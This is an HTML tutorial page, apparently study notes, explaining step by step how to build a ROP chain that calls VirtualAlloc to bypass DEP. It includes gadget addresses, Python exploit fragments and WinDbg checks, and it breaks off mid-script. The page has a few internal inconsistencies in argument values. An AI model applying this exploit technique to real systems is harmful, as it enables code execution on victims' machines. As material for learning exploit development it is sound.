
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ROP_WALKTHROUGH_</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg:       #0a0a0a;
    --bg1:      #111111;
    --bg2:      #1a1a1a;
    --bg3:      #222222;
    --text:     #e8e4d9;
    --muted:    #6b6860;
    --green:    #b8ff5a;
    --green-dim:#6a9934;
    --blue:     #7ec8e3;
    --orange:   #ff8c42;
    --purple:   #c792ea;
    --red:      #ff6b6b;
    --yellow:   #ffd580;
    --border:   #2a2a2a;
    --border-g: #2e3d1a;
  }

  html { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; line-height: 1.75; scroll-behavior: smooth; }

  body { max-width: 820px; margin: 0 auto; padding: 3rem 2rem 6rem; }

  /* ── HEADER ── */
  .doc-title {
    font-size: 2rem;
    font-weight: 700;
    color: var(--green);
    letter-spacing: 0.04em;
    border-bottom: 1px solid var(--border-g);
    padding-bottom: 1rem;
    margin-bottom: 0.5rem;
  }
  .doc-sub { color: var(--muted); font-size: 12px; margin-bottom: 3rem; }

  /* ── SECTION HEADERS ── */
  h2 {
    font-size: 0.85rem;
    font-weight: 700;
    color: var(--green);
    letter-spacing: 0.12em;
    margin: 3.5rem 0 1.2rem;
    padding-bottom: 0.4rem;
    border-bottom: 1px solid var(--border-g);
  }
  h2::before { content: "## "; color: var(--green-dim); }

  /* ── PROSE ── */
  p { margin-bottom: 1rem; color: var(--text); }
  strong { color: var(--green); font-weight: 500; }
  em { color: var(--yellow); font-style: italic; }

  blockquote {
    border-left: 2px solid var(--green);
    margin: 1.5rem 0;
    padding: 0.75rem 1.25rem;
    background: var(--bg2);
    color: var(--green);
    font-weight: 500;
  }
  blockquote p { color: var(--green); margin: 0; }

  hr { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }

  /* ── CODE BLOCKS ── */
  pre {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-left: 2px solid var(--border-g);
    border-radius: 4px;
    padding: 1rem 1.25rem;
    overflow-x: auto;
    margin: 1rem 0 1.5rem;
    font-size: 13px;
    line-height: 1.6;
  }
  code { font-family: 'JetBrains Mono', monospace; }
  p code, li code {
    background: var(--bg2);
    border: 1px solid var(--border);
    padding: 1px 5px;
    border-radius: 3px;
    font-size: 12px;
    color: var(--blue);
  }

  /* syntax */
  .kw  { color: var(--purple); }
  .fn  { color: var(--yellow); }
  .hex { color: var(--blue); }
  .str { color: #98c379; }
  .cm  { color: var(--muted); font-style: italic; }
  .num { color: var(--orange); }
  .op  { color: var(--green-dim); }

  /* windbg arrow commands */
  .wd  { color: var(--orange); }
  .wd-arrow { color: var(--green-dim); }

  /* stack frame display */
  .stack-frame {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 1rem 1.25rem;
    margin: 1rem 0 1.5rem;
    font-size: 12px;
    line-height: 1.8;
  }
  .sf-label { color: var(--muted); font-size: 11px; margin-bottom: 6px; letter-spacing: 0.08em; }
  .sf-addr  { color: var(--muted); display: inline-block; width: 100px; }
  .sf-esp   { color: var(--green); font-weight: 700; }
  .sf-val   { color: var(--blue); }
  .sf-cons  { color: #3a3a38; text-decoration: line-through; }
  .sf-arg   { color: var(--orange); }
  .sf-arrow { color: var(--green); display: inline-block; width: 16px; }
  .sf-cm    { color: var(--muted); font-style: italic; }

  /* register pills */
  .regs { display: flex; flex-wrap: wrap; gap: 8px; margin: 0.75rem 0 1rem; }
  .reg {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 3px;
    padding: 4px 10px;
    font-size: 12px;
  }
  .reg .rn { color: var(--muted); margin-right: 6px; }
  .reg .rv { color: var(--blue); }
  .reg.changed { border-color: var(--green-dim); background: #111d08; }
  .reg.changed .rv { color: var(--green); }

  /* ── TABLE ── */
  table { width: 100%; border-collapse: collapse; margin: 1rem 0 1.5rem; font-size: 12px; }
  th { text-align: left; color: var(--green); font-weight: 500; border-bottom: 1px solid var(--border-g); padding: 6px 12px 6px 0; letter-spacing: 0.06em; font-size: 11px; }
  td { padding: 7px 12px 7px 0; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; }
  td code { background: var(--bg3); border: none; padding: 1px 6px; font-size: 11px; color: var(--blue); }
  tr:last-child td { border-bottom: none; }

  /* ── STEPPER ── */
  .stepper {
    background: var(--bg1);
    border: 1px solid var(--border-g);
    border-radius: 6px;
    padding: 1.5rem;
    margin: 1.5rem 0 2rem;
  }
  .step-pill {
    display: inline-block;
    background: var(--border-g);
    color: var(--green);
    font-size: 11px;
    padding: 2px 10px;
    border-radius: 12px;
    margin-bottom: 8px;
    letter-spacing: 0.06em;
  }
  .step-label { color: var(--text); font-size: 13px; margin-bottom: 1rem; font-weight: 500; }
  .instr-box {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-left: 2px solid var(--green-dim);
    border-radius: 4px;
    padding: 10px 14px;
    margin-bottom: 1rem;
    font-size: 12px;
  }
  .instr-addr { color: var(--muted); font-size: 11px; margin-bottom: 3px; }
  .instr-asm  { color: var(--green); font-size: 13px; margin-bottom: 5px; }
  .instr-why  { color: var(--muted); font-size: 12px; font-style: italic; }
  .step-regs  { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 1rem; }
  .step-stack { font-size: 11px; line-height: 1.9; }
  .ss-row { display: flex; align-items: center; }
  .ss-addr { color: var(--muted); width: 100px; flex-shrink: 0; }
  .ss-arr  { width: 14px; color: var(--green); flex-shrink: 0; }
  .ss-val  { }
  .ss-val.esp-row  { color: var(--green); font-weight: 500; }
  .ss-val.consumed { color: #333; text-decoration: line-through; }
  .ss-val.arg-row  { color: var(--orange); }
  .ss-val.neutral  { color: var(--blue); }
  .step-btns { display: flex; gap: 10px; align-items: center; margin-top: 1.2rem; }
  .step-btns button {
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    padding: 6px 14px;
    border-radius: 3px;
    cursor: pointer;
    transition: border-color .15s, color .15s;
  }
  .step-btns button:hover:not(:disabled) { border-color: var(--green-dim); color: var(--green); }
  .step-btns button:disabled { opacity: 0.3; cursor: default; }
  .step-prog { flex: 1; height: 2px; background: var(--border); border-radius: 1px; overflow: hidden; }
  .step-prog-fill { height: 100%; background: var(--green-dim); border-radius: 1px; transition: width .3s; }

  /* ── CALLOUT ── */
  .callout {
    background: #111d08;
    border: 1px solid var(--border-g);
    border-radius: 4px;
    padding: 0.9rem 1.1rem;
    margin: 1.2rem 0;
    font-size: 13px;
  }
  .callout .label { color: var(--green-dim); font-size: 11px; letter-spacing: 0.1em; margin-bottom: 4px; }
  .callout p { color: var(--text); margin: 0; }

  /* ── PATTERN BEATS ── */
  .beats { counter-reset: beat; margin: 1rem 0 1.5rem; }
  .beat {
    display: flex;
    gap: 1rem;
    padding: 0.6rem 0;
    border-bottom: 1px solid var(--border);
    font-size: 13px;
  }
  .beat:last-child { border-bottom: none; }
  .beat-n { color: var(--green); font-weight: 700; width: 18px; flex-shrink: 0; }
  .beat-op { color: var(--blue); width: 180px; flex-shrink: 0; }
  .beat-why { color: var(--muted); }
</style>
</head>
<body>

<div class="doc-title">ROP_WALKTHROUGH_</div>
<div class="doc-sub">one note to rule them all &mdash; exploit.py as the skeleton, CPU as the teacher</div>

<blockquote><p>you cannot write null bytes into your buffer. but VirtualAlloc needs null bytes as args. so you never write the args &mdash; you compute them at runtime using gadgets, and write the results into placeholder slots you already laid out in your buffer.</p></blockquote>

<p>that's the entire reason a ROP chain exists for DEP bypass. everything else is just mechanics of getting there.</p>

<hr>

<h2>PHASE 0 &mdash; BEFORE YOU TOUCH rp++</h2>

<p>draw this on paper. literally. every time.</p>

<pre><span class="cm">[ JUNK (276 - len(va)) ][ va block ][ eip ][ rop chain → ]
                              ↑
                         6 slots you control</span></pre>

<p>the <code>va</code> block is your argument layout for VirtualAlloc. stdcall means when you <code>ret</code> into VirtualAlloc, ESP must already look like a normal call just happened:</p>

<pre>[VirtualAlloc addr]   <span class="cm">← you ret INTO this</span>
[return addr]         <span class="cm">← where VA returns after (→ shellcode)</span>
[lpAddress]           <span class="cm">← NULL  = 0x00000000  ← NULL BYTE</span>
[dwSize]              <span class="cm">← 0x1000              ← NULL BYTE</span>
[flAllocationType]    <span class="cm">← 0x1000 (MEM_COMMIT) ← NULL BYTE</span>
[flProtect]           <span class="cm">← 0x40  (PAGE_EXECUTE_READWRITE) ← NULL BYTE</span></pre>

<p>every slot with a null byte = you cannot write it directly into the buffer. gadgets will compute those values and patch them in at runtime.</p>

<hr>

<h2>PHASE 0.5 &mdash; WHAT THE CPU ACTUALLY DOES ON EVERY RET</h2>

<p>before anything else &mdash; understand this loop. it's the only thing running the entire chain.</p>

<pre><span class="kw">ret</span>  =  <span class="fn">EIP</span> = [<span class="fn">ESP</span>]   <span class="cm">← jump to whatever address is sitting at ESP</span>
         <span class="fn">ESP</span> = <span class="fn">ESP</span> + <span class="num">4</span>  <span class="cm">← move the cursor forward</span></pre>

<p>that's it. one instruction. repeated forever. you control what's on the stack, so you control every jump. the CPU doesn't know it's being played. step through it:</p>

<!-- ── INTERACTIVE STEPPER ── -->
<div class="stepper">
  <div class="step-pill" id="s-pill">step 1 of 7</div>
  <div class="step-label" id="s-label">EIP lands on gadget 1 — chain begins</div>
  <div class="instr-box">
    <div class="instr-addr" id="s-addr">0x50501110</div>
    <div class="instr-asm"  id="s-asm">push esp ; push eax ; pop edi ; pop esi ; ret</div>
    <div class="instr-why"  id="s-why">captures live ESP into ESI — your buffer anchor for the whole chain</div>
  </div>
  <div class="step-regs" id="s-regs"></div>
  <div class="step-stack" id="s-stack"></div>
  <div class="step-btns">
    <button onclick="sPrev()" id="s-prev">← prev</button>
    <div class="step-prog"><div class="step-prog-fill" id="s-prog"></div></div>
    <button onclick="sNext()" id="s-next">next ret →</button>
  </div>
</div>

<p>watch the consumed rows go dark on each step &mdash; that's the tape being read left to right. by the time all args are patched, the entire gadget section is eaten. only the va[] slots remain, sitting clean, ready for VirtualAlloc.</p>

<pre><span class="cm">before:  [gadget addresses......][va[0]..va[5]][shellcode]</span>
<span class="cm">after:   [consumed.............][patched vals][shellcode]</span>
                                       <span class="green-dim">↑</span>
                  <span class="cm">ESP lands here → ret → VirtualAlloc fires</span></pre>

<hr>

<h2>PHASE 1 &mdash; CAPTURE ESP (the anchor)</h2>

<pre><span class="cm"># python</span>
<span class="fn">eip</span> = <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50501110</span>)) <span class="cm"># push esp ; push eax ; pop edi ; pop esi ; ret</span></pre>

<p>trace it by hand:</p>

<pre><span class="kw">push</span> esp  <span class="op">→</span> stack: [ESP_value]
<span class="kw">push</span> eax  <span class="op">→</span> stack: [ESP_value][EAX_value]  <span class="cm">(EAX on top)</span>
<span class="kw">pop</span>  edi  <span class="op">→</span> EDI = EAX_value  <span class="cm">(throwaway)</span>
<span class="kw">pop</span>  esi  <span class="op">→</span> ESI = ESP_value  <span class="cm">← THIS IS THE GOLD</span>
<span class="kw">ret</span>       <span class="op">→</span> chain continues</pre>

<p><strong>ESI now = a live pointer into the middle of your buffer, captured at runtime.</strong> you don't know the stack address before the exploit runs &mdash; you don't need to. you laid out the buffer yourself with <code>pack()</code>, so you know the exact byte distance from ESI to every slot in va[]. that's your ruler.</p>

<hr>

<h2>PHASE 2 &mdash; ALIGN EAX TO va[0]</h2>

<p>ESI points somewhere in the ROP chain region. the <code>va</code> block is behind ESI in memory (lower address). need EAX to walk backward.</p>

<pre><span class="cm"># python</span>
<span class="fn">rop</span>  = <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5050118e</span>))  <span class="cm"># mov eax, esi ; pop esi ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x42424242</span>))  <span class="cm"># junk — consumed by that pop esi</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x505115a3</span>))  <span class="cm"># pop ecx ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0xffffffe4</span>))  <span class="cm"># ECX = -0x1C  (signed: -28 bytes)</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051579a</span>))  <span class="cm"># add eax, ecx ; ret</span></pre>

<p>why <code>-0x1C</code>? va[0] sits 28 bytes <strong>before</strong> the captured ESI. backward = negative. only have <code>add eax, ecx</code> available &mdash; not subtract &mdash; so you put a negative value into ECX and add it. same result as subtracting.</p>

<div class="callout">
  <div class="label">BRAIN UNLOCK</div>
  <p>the sign of the constant adapts to the operator rp++ gave you, not the other way. you always work backwards from "what value do i need" to "what constant makes this gadget produce it."</p>
</div>

<hr>

<h2>PHASE 3 &mdash; HANDOFF: EAX &rarr; ESI</h2>

<pre><span class="cm"># python</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50537d5b</span>))  <span class="cm"># push eax ; pop esi ; ret</span></pre>

<p>this is the core pattern that repeats the entire chain:</p>

<pre><span class="fn">ESI</span> = <span class="str">"where to write"</span>   <span class="cm">(destination pointer, parked and stable)</span>
<span class="fn">EAX</span> = <span class="str">"what to write"</span>    <span class="cm">(scratch, about to get reloaded for actual value)</span></pre>

<p>you just finished computing a destination in EAX using arithmetic gadgets. now you park it in ESI before EAX gets reused for the next job. every single "push eax ; pop esi" in the chain is this exact handoff.</p>

<hr>

<h2>PHASE 4 &mdash; PATCH va[0]: REAL VIRTUALALLOC ADDRESS</h2>

<p>real address is <code>0x5054A220</code>. problem: <code>0x20</code> is a bad char (space). can't write it into the buffer. solution: off-by-one + correct after.</p>

<pre><span class="cm"># python</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5053a0f5</span>))  <span class="cm"># pop eax ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5054A221</span>))  <span class="cm"># +1 from real addr — no bad byte</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x505115a3</span>))  <span class="cm"># pop ecx ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0xffffffff</span>))  <span class="cm"># ECX = -1</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051579a</span>))  <span class="cm"># add eax, ecx ; ret  → EAX = 0x5054A220 ✓</span></pre>

<p>but <code>0x5054A220</code> is a <strong>stub address</strong> (IAT entry) &mdash; not VirtualAlloc's actual code. the OS loader resolved the real address there at load time. dereference it:</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051f278</span>))  <span class="cm"># mov eax, dword[eax] ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051cbb6</span>))  <span class="cm"># mov dword[esi], eax ; ret</span></pre>

<p>verify in WinDbg:</p>

<pre><span class="wd-arrow">--&gt;</span> <span class="wd">dd esi L1</span>        <span class="cm">check what's now sitting at ESI</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">u poi(esi)</span>       <span class="cm">disassemble — should look like VirtualAlloc</span></pre>

<hr>

<h2>PHASE 5 &mdash; ADVANCE ESI TO va[1]</h2>

<p>va[1] is 4 bytes after va[0]. need <code>inc esi &times; 4</code>. no <code>add esi, 4</code> gadget exists in this module. so:</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))  <span class="cm"># inc esi ; add al, 0x2b ; ret  ×4</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))</pre>

<p><code>add al, 0x2b</code> is a side effect &mdash; dirts the low byte of EAX. doesn't matter because EAX gets reloaded next anyway. <strong>know your side effects, then decide if they matter.</strong> if the perfect gadget doesn't exist, spam the imperfect one N times.</p>

<hr>

<h2>PHASE 6 &mdash; PATCH va[1]: SHELLCODE RETURN ADDRESS</h2>

<p>shellcode lives ~0x210 bytes ahead. <code>sub eax, ecx</code> with a negative ECX = adding forward.</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5050118e</span>))  <span class="cm"># mov eax, esi ; pop esi ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x42424242</span>))  <span class="cm"># junk pad</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5052f773</span>))  <span class="cm"># push eax ; pop esi ; ret  ← re-park ESI</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x505115a3</span>))  <span class="cm"># pop ecx ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0xfffffdf0</span>))  <span class="cm"># ECX = -0x210</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50533bf4</span>))  <span class="cm"># sub eax, ecx ; ret  → eax - (-0x210) = eax + 0x210</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051cbb6</span>))  <span class="cm"># mov dword[esi], eax ; ret</span></pre>

<hr>

<h2>PHASE 7 &mdash; PATCH va[2]: lpAddress (same as shellcode addr)</h2>

<p>same walk, offset is <code>-0x20C</code> instead of <code>-0x210</code> (4 bytes further along = one slot):</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))  <span class="cm"># inc esi ×4</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50522fa7</span>))
<span class="cm"># ... same compute + sub + write pattern, offset 0xfffffdf4 (-0x20C)</span></pre>

<hr>

<h2>PHASE 8 &mdash; PATCH va[3]: dwSize = 0x1</h2>

<p><code>neg</code> trick: pop -1, flip sign, get 1. no null ever written.</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5053a0f5</span>))  <span class="cm"># pop eax ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0xffffffff</span>))  <span class="cm"># EAX = -1</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x50527840</span>))  <span class="cm"># neg eax ; ret  → EAX = 0x00000001</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051cbb6</span>))  <span class="cm"># mov dword[esi], eax ; ret</span></pre>

<hr>

<h2>PHASE 9 &mdash; PATCH va[4]: flAllocationType = 0x1000</h2>

<p>0x1000 has null bytes. integer overflow trick: two clean ints that sum past 0xFFFFFFFF, carry falls off, leaves the dirty target.</p>

<pre><span class="cm">  0x80808080
+ 0x7f7f8f80
-----------
1,00001000   ← carry overflows off 32-bit, leaves 0x00001000</span></pre>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5053a0f5</span>))  <span class="cm"># pop eax ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x80808080</span>))  <span class="cm"># first operand — no null bytes</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x505115a3</span>))  <span class="cm"># pop ecx ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x7f7f8f80</span>))  <span class="cm"># second operand — no null bytes</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051579a</span>))  <span class="cm"># add eax, ecx ; ret  → EAX = 0x00001000 ✓</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051cbb6</span>))  <span class="cm"># mov dword[esi], eax ; ret</span></pre>

<p>python sanity check for any overflow pair:</p>

<pre><span class="cm"># python</span>
target = <span class="hex">0x1000</span>
a = <span class="hex">0x80808080</span>
b = (target - a) &amp; <span class="hex">0xFFFFFFFF</span>
<span class="fn">print</span>(<span class="fn">hex</span>(b))  <span class="cm"># → 0x7f7f8f80 — guaranteed clean second operand</span></pre>

<hr>

<h2>PHASE 10 &mdash; PATCH va[5]: flProtect = 0x40</h2>

<p>same overflow trick. <code>0x80808080 + 0x7f7f7fc0</code> wraps to <code>0x00000040</code>.</p>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5053a0f5</span>))  <span class="cm"># pop eax ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x80808080</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x505115a3</span>))  <span class="cm"># pop ecx ; ret</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x7f7f7fc0</span>))
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051579a</span>))  <span class="cm"># add eax, ecx ; ret  → EAX = 0x00000040 ✓</span>
<span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051cbb6</span>))  <span class="cm"># mov dword[esi], eax ; ret</span></pre>

<p><strong>va[5] patched. all 6 slots done.</strong></p>

<hr>

<h2>PHASE 11 &mdash; DEBUGGING CHECKPOINT</h2>

<pre><span class="fn">rop</span> += <span class="fn">pack</span>(<span class="str">"&lt;L"</span>, (<span class="hex">0x5051e4db</span>))  <span class="cm"># int3 ; push eax ; call esi</span></pre>

<p>baked-in breakpoint. drop it before the VirtualAlloc call. when WinDbg hits it, verify every slot:</p>

<pre><span class="wd-arrow">--&gt;</span> <span class="wd">dd [address of va block] L6</span></pre>

<p>you should see:</p>

<pre><span class="hex">addr+0</span>:  <span class="hex">5054A220</span>   <span class="cm">← real VirtualAlloc (dereferenced stub)</span>
<span class="hex">addr+4</span>:  <span class="hex">[shellcode addr]</span>
<span class="hex">addr+8</span>:  <span class="hex">[shellcode addr]</span>  <span class="cm">(same — lpAddress)</span>
<span class="hex">addr+C</span>:  <span class="hex">00000001</span>
<span class="hex">addr+10</span>: <span class="hex">00001000</span>
<span class="hex">addr+14</span>: <span class="hex">00000040</span></pre>

<p>if any slot is wrong, the bug is in the gadget block that patched that specific slot &mdash; not in VirtualAlloc itself. remove the int3 line for the final exploit.</p>

<hr>

<h2>PHASE 12 &mdash; EXECUTE VIRTUALALLOC</h2>

<p>everything is patched. ESP needs to point at va[0] and a <code>ret</code> kicks it off. at this point ESI sits at va[5]. walk it backward to va[0] (usually <code>push esi ; pop esp ; ret</code> with subtraction correction) then ret in.</p>

<p>once VirtualAlloc executes:</p>

<pre><span class="cm">memory at shellcode addr → RWX
VirtualAlloc returns to va[1] = shellcode addr
shellcode runs</span></pre>

<hr>

<h2>THE REPEATING PATTERN &mdash; MEMORISE THIS</h2>

<p>every arg patch is the same 4 beats:</p>

<div class="beats">
  <div class="beat"><span class="beat-n">1</span><span class="beat-op">advance ESI</span><span class="beat-why">inc esi ×4 &mdash; or arithmetic walk if the slot is far</span></div>
  <div class="beat"><span class="beat-n">2</span><span class="beat-op">compute value</span><span class="beat-why">pop eax → arithmetic → EAX = target (no nulls ever touch the buffer)</span></div>
  <div class="beat"><span class="beat-n">3</span><span class="beat-op">park ESI</span><span class="beat-why">push eax ; pop esi &mdash; if EAX held the destination during nav</span></div>
  <div class="beat"><span class="beat-n">4</span><span class="beat-op">write</span><span class="beat-why">mov dword[esi], eax</span></div>
</div>

<p>the only things that change per slot: the offset you walk, and the arithmetic trick you use to produce the target value cleanly.</p>

<hr>

<h2>SIGN / OPERATOR QUICK REFERENCE</h2>

<table>
  <thead><tr><th>situation</th><th>gadget you have</th><th>what you do</th></tr></thead>
  <tbody>
    <tr><td>target BEHIND (lower addr)</td><td><code>add eax, ecx</code></td><td>ECX = negative offset</td></tr>
    <tr><td>target AHEAD (higher addr)</td><td><code>add eax, ecx</code></td><td>ECX = positive offset</td></tr>
    <tr><td>target BEHIND</td><td><code>sub eax, ecx</code></td><td>ECX = positive offset</td></tr>
    <tr><td>target AHEAD</td><td><code>sub eax, ecx</code></td><td>ECX = negative offset (sub neg = add)</td></tr>
    <tr><td>value has null byte</td><td>overflow trick</td><td>two clean ints summing past 0xFFFFFFFF</td></tr>
    <tr><td>value has bad char</td><td>off-by-one</td><td>write ±1, correct with ecx = ∓1</td></tr>
    <tr><td>need value 1</td><td>neg trick</td><td>pop -1 → neg eax → 1</td></tr>
    <tr><td>need value 0</td><td>xor trick</td><td>xor eax, eax</td></tr>
  </tbody>
</table>

<div class="callout">
  <div class="label">THE RULE</div>
  <p>the operator is fixed (whatever rp++ found). the sign of the constant is whatever makes that operator produce the right answer. algebra, not magic.</p>
</div>

<hr>

<h2>WINDBG STEP RHYTHM</h2>

<pre><span class="wd-arrow">--&gt;</span> <span class="wd">bp [address of first gadget]</span>    <span class="cm">break at chain entry</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">g</span>                               <span class="cm">run to breakpoint</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">t</span>                               <span class="cm">step ONE instruction</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">r</span>                               <span class="cm">check registers — match your paper ruler?</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">dd esi L1</span>                       <span class="cm">verify ESI destination is correct slot</span>
<span class="wd-arrow">--&gt;</span> <span class="wd">t</span>                               <span class="cm">next instruction</span></pre>

<p>never run the full chain blind. the moment a register doesn't match what your ruler predicted &mdash; that's your bug, right there, not somewhere downstream.</p>

<hr>

<h2>TL;DR MENTAL MODEL</h2>

<pre><span class="fn">ESI</span>  = address of the slot currently being patched   <span class="cm">(stable, only moves when you advance it)</span>
<span class="fn">EAX</span>  = current value being computed / written         <span class="cm">(constantly reused, never stable)</span>

<span class="kw">push</span> eax <span class="op">;</span> <span class="kw">pop</span> esi  = <span class="str">"destination computed — park before EAX gets reused"</span>
<span class="kw">mov</span> dword[esi], eax = <span class="str">"write EAX into wherever ESI points"</span>
<span class="kw">inc</span> esi <span class="op">×</span> <span class="num">4</span>         = <span class="str">"move destination pointer to next 4-byte slot"</span></pre>

<pre><span class="cm">one captured ESP
  → 6 slots
    → 6 arithmetic puzzles (no nulls ever touch the buffer)
      → ret into VirtualAlloc
        → RWX memory
          → shellcode</span></pre>

<script>
const steps = [
  {
    label: "EIP lands on gadget 1 — chain begins",
    addr:  "0x50501110",
    asm:   "push esp ; push eax ; pop edi ; pop esi ; ret",
    why:   "captures live ESP into ESI — buffer anchor for the whole chain",
    regs:  [["EIP","0x50501110",true],["ESP","0xBFFF0030",false],["ESI","0x????????",false],["EAX","0x????????",false]],
    stack: [
      ["0xBFFF0030","→","0x50501110  ← gadget 1","esp-row"],
      ["0xBFFF0034"," ","0x5050118e    (gadget 2)","neutral"],
      ["0xBFFF0038"," ","0x42424242    (junk pad)","neutral"],
      ["0xBFFF003C"," ","0x505115a3    (gadget 3)","neutral"],
      ["0xBFFF0040"," ","0xffffffe4    (-0x1C)","neutral"],
      ["0xBFFF0044"," ","0x5051579a    (gadget 4)","neutral"],
      ["...       "," ","[more gadgets...]","neutral"],
      ["0xBFFF0060"," ","0x45454545    (dummy VA addr)","arg-row"],
      ["0xBFFF0064"," ","0x46464646    (return addr)","arg-row"],
    ]
  },
  {
    label: "ret fires — ESI captured, EIP jumps to gadget 2",
    addr:  "0x50501110 + ret",
    asm:   "ret  →  EIP = [ESP] = 0x5050118e  ;  ESP += 4",
    why:   "ESI = 0xBFFF0030 (live stack anchor locked in). one DWORD consumed.",
    regs:  [["EIP","0x5050118e",true],["ESP","0xBFFF0034",true],["ESI","0xBFFF0030",true],["EAX","0x????????",false]],
    stack: [
      ["0xBFFF0030","✗","0x50501110   (consumed)","consumed"],
      ["0xBFFF0034","→","0x5050118e  ← gadget 2","esp-row"],
      ["0xBFFF0038"," ","0x42424242    (junk pad)","neutral"],
